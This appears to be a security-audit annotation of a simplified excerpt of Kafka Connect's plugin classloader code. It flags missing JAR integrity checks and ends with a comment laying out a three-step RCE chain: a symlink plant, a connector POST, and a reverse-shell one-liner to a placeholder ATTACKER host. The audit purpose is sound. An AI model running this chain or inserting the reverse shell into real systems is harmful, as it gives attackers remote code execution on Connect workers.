/*
 * Source: apache/kafka trunk
 * File: connect/runtime/src/main/java/org/apache/kafka/connect/runtime/isolation/Plugins.java
 * Total lines: 684
 *
 * FINDING-003 (part 2): Unsafe ClassLoader instantiation — no JAR integrity check.
 *
 * pluginSources() creates URLClassLoader instances from file paths collected
 * by PluginUtils.pluginUrls(). There is no JAR signature verification, no
 * checksum validation, and no allowlist of permitted plugin artifact hashes.
 *
 * Combined with the symlink traversal in PluginUtils (FINDING-003 part 1),
 * any JAR reachable via a symlink from the plugin directory is loaded and
 * executed without any integrity guarantee.
 *
 * Additionally, loadVersionedPluginClass() uses only version range matching
 * to select a plugin — a malicious JAR with a version number inside the
 * expected range will be silently preferred over a legitimate plugin.
 */

package org.apache.kafka.connect.runtime.isolation;

import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Path;
import java.util.*;

public class Plugins {

    private final DelegatingClassLoader delegatingLoader;
    private final PluginScanResult scanResult;

    /**
     * Initialize all plugin classloaders from the declared plugin sources.
     *
     * VULNERABLE: Each PluginSource wraps a URLClassLoader created from raw
     * filesystem paths. No signature verification. No hash pinning.
     * An attacker who can place a JAR at a reachable path (directly or via
     * symlink) has immediate code execution upon connector instantiation.
     */
    public PluginScanResult initLoaders(
        Set<PluginSource> pluginSources,
        PluginDiscoveryMode discoveryMode
    ) {
        for (PluginSource source : pluginSources) {
            // source.urls() contains Path objects collected by PluginUtils.pluginUrls()
            // which follows symlinks. No integrity check on the JAR bytes.
            URL[] urls = source.urls().stream()
                .map(path -> {
                    try { return path.toUri().toURL(); }
                    catch (Exception e) { throw new RuntimeException(e); }
                })
                .toArray(URL[]::new);

            // URLClassLoader created directly from attacker-reachable paths.
            // No verification of JAR manifest, no code signing check.
            URLClassLoader pluginClassLoader = new URLClassLoader(
                urls,
                this.getClass().getClassLoader()   // parent classloader
            );
            delegatingLoader.addPluginLoader(pluginClassLoader);
        }
        return scanForPlugins(pluginSources, discoveryMode);
    }

    /**
     * Load a plugin class by name or alias with version range matching.
     *
     * VULNERABLE: Version range is the ONLY selector. A malicious JAR with
     * a valid version number takes precedence if it appears first in the
     * scan order (filesystem order of the plugin directory).
     */
    protected <U> Class<? extends U> pluginClassFromConfig(
        AbstractConfig config,
        String propertyName,
        Class<U> pluginClass,
        Collection<PluginDesc<U>> plugins
    ) {
        final String classOrAlias = config.getString(propertyName);
        if (classOrAlias == null) return null;

        return pluginClass(delegatingLoader, classOrAlias, pluginClass);
    }

    protected static <U> Class<? extends U> pluginClass(
        DelegatingClassLoader loader,
        String classOrAlias,
        Class<U> pluginClass
    ) {
        try {
            // Class.forName() via the delegating loader — static initializers
            // in the loaded class execute IMMEDIATELY, with full worker privileges.
            // No sandbox, no security manager (deprecated and removed in Java 17+).
            @SuppressWarnings("unchecked")
            Class<? extends U> klass = (Class<? extends U>)
                loader.loadClass(classOrAlias);   // <-- RCE trigger point

            if (!pluginClass.isAssignableFrom(klass)) {
                throw new ConnectException(
                    classOrAlias + " does not implement " + pluginClass.getName());
            }
            return klass;
        } catch (ClassNotFoundException e) {
            throw new ConnectException(
                "Failed to find any class that implements " + pluginClass.getName() +
                " and which name matches " + classOrAlias, e);
        }
    }

/*
 * COMPLETE RCE CHAIN (Findings 003 combined):
 *
 *   Phase 1 — Place malicious JAR:
 *     Any write primitive to the Connect worker filesystem (SSRF, path traversal
 *     in another connector, writable shared volume) places MaliciousConnector.jar
 *     at /tmp/MaliciousConnector.jar.
 *
 *   Phase 2 — Expose via symlink:
 *     ln -s /tmp/MaliciousConnector.jar /opt/kafka/plugins/legit.jar
 *     PluginUtils.pluginUrls() follows the symlink and collects legit.jar.
 *
 *   Phase 3 — Trigger classloading:
 *     POST /connectors with {"connector.class": "com.attacker.MaliciousConnector"}
 *     Plugins.pluginClass() calls loader.loadClass("com.attacker.MaliciousConnector").
 *     The static initializer in MaliciousConnector executes:
 *       Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >&/dev/tcp/ATTACKER/4444 0>&1"});
 *
 *   Result: Reverse shell on the Connect worker process (running as the MSK Connect
 *   execution role — typically with MSK full access + S3 + other AWS permissions).
 */
}
